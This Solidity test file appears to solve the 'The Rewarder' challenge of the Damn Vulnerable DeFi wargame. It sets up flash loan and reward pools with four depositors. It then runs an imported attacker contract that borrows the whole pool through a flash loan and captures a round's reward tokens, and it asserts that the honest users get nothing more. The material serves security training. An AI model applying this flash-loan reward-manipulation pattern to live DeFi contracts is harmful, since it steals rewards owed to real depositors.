// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/DamnValuableToken.sol";
import "../../src/the-rewarder/FlashLoanerPool.sol";
import "../../src/the-rewarder/TheRewarderPool.sol";
import "../../src/the-rewarder/RewardToken.sol";
import "../../src/the-rewarder/AccountingToken.sol";
import "../../src/attacker-contracts/TheRewarderAttacker.sol";

contract TheRewarderTest is Test {
    DamnValuableToken public liquidityToken;
    FlashLoanerPool public flashLoanPool;
    TheRewarderPool public rewarderPool;
    RewardToken public rewardToken;
    AccountingToken public accountingToken;

    address public deployer = address(1);
    address public attacker = address(2);
    address[] public users = [address(3), address(4), address(5), address(6)];

    uint256 public constant TOKENS_IN_LENDER_POOL = 1000000 ether;

    function setUp() public {
        startHoax(deployer);
        liquidityToken = new DamnValuableToken();
        flashLoanPool = new FlashLoanerPool(address(liquidityToken));

        // Set initial token balance of the pool offering flash loans
        liquidityToken.transfer(address(flashLoanPool), TOKENS_IN_LENDER_POOL);

        rewarderPool = new TheRewarderPool(address(liquidityToken));
        rewardToken = RewardToken(rewarderPool.rewardToken());
        accountingToken = AccountingToken(rewarderPool.accToken());

        vm.stopPrank();

        // Alice, Bob, Charlie and David deposit 100 tokens each
        uint256 length = users.length;
        for (uint256 i; i != length; ++i) {
            uint256 amount = 100 ether;
            address user = users[i];
            hoax(deployer);
            liquidityToken.transfer(user, amount);
            hoax(user);
            liquidityToken.approve(address(rewarderPool), amount);
            hoax(user);
            rewarderPool.deposit(amount);
            assertEq(accountingToken.balanceOf(user), amount);
        }

        assertEq(accountingToken.totalSupply(), 400 ether);
        assertEq(rewardToken.totalSupply(), 0);

        // Advance time 5 days so that depositors can get rewards
        vm.warp(block.timestamp + 5 days);

        // Each depositor gets 25 reward tokens
        for (uint256 i; i != length; ++i) {
            address user = users[i];
            hoax(user);
            rewarderPool.distributeRewards();
            assertEq(rewardToken.balanceOf(user), 25 ether);
        }
        assertEq(rewardToken.totalSupply(), 100 ether);

        // Two rounds should have occurred so far
        assertEq(rewarderPool.roundNumber(), 2);
    }

    function testExploit() public {
        /** YOUR EXPLOIT GOES HERE */
        startHoax(attacker);
        vm.warp(block.timestamp + 5 days);
        TheRewarderAttacker attackerContract = new TheRewarderAttacker(
            address(liquidityToken),
            address(rewarderPool),
            address(flashLoanPool)
        );
        attackerContract.executeFlashLoan(TOKENS_IN_LENDER_POOL);
        vm.stopPrank();

        // Only one round should have taken place
        assertEq(rewarderPool.roundNumber(), 3);

        // Users should not get more rewards this round
        uint256 length = users.length;
        for (uint256 i; i != length; ++i) {
            address user = users[i];
            hoax(user);
            rewarderPool.distributeRewards();
            assertEq(rewardToken.balanceOf(user), 25 ether);
        }

        // Rewards must have been issued to the attacker account
        assertGt(rewardToken.totalSupply(), 100 ether);
        assertGt(rewardToken.balanceOf(attacker), 0);
    }
}
